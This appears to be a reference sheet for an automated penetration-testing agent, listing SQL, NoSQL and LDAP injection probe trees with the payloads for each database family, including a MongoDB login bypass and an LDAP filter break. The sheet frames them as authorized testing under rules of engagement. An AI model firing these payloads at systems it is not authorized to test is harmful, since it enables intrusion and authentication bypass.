---
name: sql_injection_trees
description: SQL injection trees (CWE-89, CWE-90) (from injection_engine specialist
  reference library)
---

# SQL injection trees (CWE-89, CWE-90)

Full probe trees per class. All payloads are canonical textbook forms against
the parameter's original value (`<v>` placeholder). Always: baseline pair
first, one variable at a time, evidence pair per family.

## 1. Probe order (canonical set — mirrors `scripts/sqli_probe.py`)

| # | Probe | Payload (`<v>` = original value) | What a delta means |
|---|-------|----------------------------------|--------------------|
| 1 | single quote | `<v>'` | quote breaks out of a string literal |
| 2 | double quote | `<v>"` | double-quoted identifier/string context |
| 3 | paren | `<v>(` | expression/subquery context, syntax error |
| 4 | comment | `<v>'-- -` | quote + trailing-comment swallow |
| 5 | boolean TRUE | `<v>' AND '1'='1'-- -` | boolean oracle, TRUE side |
| 6 | boolean FALSE | `<v>' AND '1'='2'-- -` | boolean oracle, FALSE side |
| 7 | sleep (gated) | `<v>' AND SLEEP(5)-- -` | time oracle; requires `--allow-time` RoE gate |

Numeric context (no quote wrapping): drop the quote (`<v> AND 1=1` /
`<v> AND 1=2`).

## 2. Error-based signatures per DBMS family

| Family | Response signature (substring to grep) | Notes |
|---|---|---|
| MySQL / MariaDB | `you have an error in your SQL syntax`, `Warning: mysql_`, `MariaDB` | comments `-- `, `#`, version comment `/*!50000 */` |
| PostgreSQL | `ERROR:  syntax error at or near`, `unterminated quoted string`, `PG::SyntaxError` | `::` cast errors, `information_schema` readable |
| MSSQL | `Unclosed quotation mark after the character string`, `Microsoft SQL`, `SqlClient` | `CONVERT`/`CAST` int-conversion errors; `WAITFOR` time oracle |
| Oracle | `ORA-01756: quoted string not properly terminated`, `ORA-00936: missing expression`, `ORA-00942: table or view does not exist` | single-quote strings only; `UTL_*` is escalation, not probing |
| SQLite | `unrecognized token`, `SQLITE_ERROR`, `near "...": syntax error` | no `SLEEP()`; heavy-compute time oracle only (below) |

Any signature in a probe-delta response = D1 error-based finding. Record the
verbatim error text; it doubles as the DBMS fingerprint for `70-exploit-intel`.

## 3. Boolean delta tree

1. Send TRUE `<v>' AND '1'='1'-- -` and FALSE `<v>' AND '1'='2'-- -`.
2. Strong signal: TRUE response byte-identical to baseline (sha256 equal)
   AND FALSE differs in status/len/sha.
3. Weak signal: TRUE and FALSE differ from each other but neither matches
   baseline — check for pagination/random-id noise first (false-positive
   checklist), keep as D1 hint.
4. Escalate the oracle for impact proof only: `<v>' AND (SELECT SUBSTR(
   version(),1,1))='8'-- -` style one-character predicates; stop at
   proving the oracle reads DBMS state. No table/data enumeration unless the
   engagement authorizes data access in writing.

## 4. Time-based tree (RoE-gated, last resort)

- Median of N>=5 on both sides; single-shot timing is never evidence.
- Payloads: MySQL `' AND SLEEP(5)-- -` (or `BENCHMARK`); PostgreSQL
  `'; SELECT pg_sleep(5)--`; MSSQL `'; WAITFOR DELAY '0:0:5'--`; Oracle
  `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--`; SQLite (no sleep) heavy
  compute `AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))`.
- Verdict rule: probe median - baseline median >= 4s across two replay runs.

## 5. UNION discovery tree

1. Column count: `<v>' ORDER BY 1-- -`, increment `ORDER BY 2`, ... until
   error/delta. Last working n = column count.
2. Pad: `<v>' UNION SELECT NULL,NULL,...,NULL-- -` (n NULLs) until the row
   renders (no type errors during discovery).
3. Echoed column: replace one NULL at a time with `'rj-pt-canary'` until the
   canary renders — that column accepts strings.
4. Impact proof: `UNION SELECT NULL,version(),NULL-- -` (or `current_user`)
   — version + current_user is the proof; data-row extraction is out unless
   authorized.
5. MySQL/MSSQL note: check the original query column count via
   `UNION SELECT NULL` errors before assuming ORDER BY worked.

## 6. NoSQL operator tree (MongoDB-style, CWE-943 adjacent)

| Goal | Bracket-notation (form) | JSON body |
|---|---|---|
| auth bypass | `username[$ne]=x&password[$ne]=x` | `{"u":{"$ne":""},"p":{"$ne":""}}` |
| range oracle | `field[$gt]=a` ... `[$lt]=z` | `{"f":{"$gt":"a"}}` |
| regex oracle | `field[$regex]=^a` | `{"f":{"$regex":"^a"}}` |
| JS time oracle (gated) | `where[$where]=sleep(5000)` (legacy servers) | `{"$where":"sleep(5000)"}` |

`$where` runs server-side JavaScript and is deprecated on modern MongoDB;
treat absence as inconclusive, never as "secure".

## 7. LDAP injection tree (CWE-90)

- Meta-characters: `*` `(` `)` `\` NUL — send each alone first, watch for
  LDAP filter errors (`malformed filter`, `Bad search filter`).
- Canonical break: `*)(uid=*))%00` against a login/search filter using the
  attribute the app queries (`uid`, `sAMAccountName`, `mail`).
- Boolean oracle: `a*` (matches) vs `zzzz*` (no match) response delta when
  the result count/shape is observable.
- Blind: behavior deltas only (HTTP status/body length); no LDAP data
  enumeration without authorization.

## 8. ORM-specific bypass notes

- Stacked queries (`; SELECT ...`) are disabled by default in most ORM/DB
  driver stacks — do not burn requests on them; use comment termination
  (`'-- -`) inside the existing statement instead.
- ActiveRecord (Ruby): `.order(params[:sort])` / `.pluck` interpolation ->
  ORDER BY injection; probe `ORDER BY id),(select version()` style only
  after plain sort tampering shows a delta; boolean via `CASE WHEN`.
- Django: `raw()` and `extra(where=...)` string interpolation; ORM filter
  layer is parameterized — probe only surfaces that build SQL text.
- Hibernate HQL: no UNION, no stacked queries; entity properties only;
  boolean predicates work (`' and '1'='1`); `QueryException` text is the
  fingerprint.
- Node (Sequelize/TypeORM): operator confusion when `{"$gt":...}` keys or
  `sequelize.literal()` reach the query layer unfiltered; JSON-body params
  are the usual entry.

## 9. Negative results

Three generations without signal on one surface: log surface, probe set,
and negative outcome in the run notes (feeds the report coverage statement),
then move on.

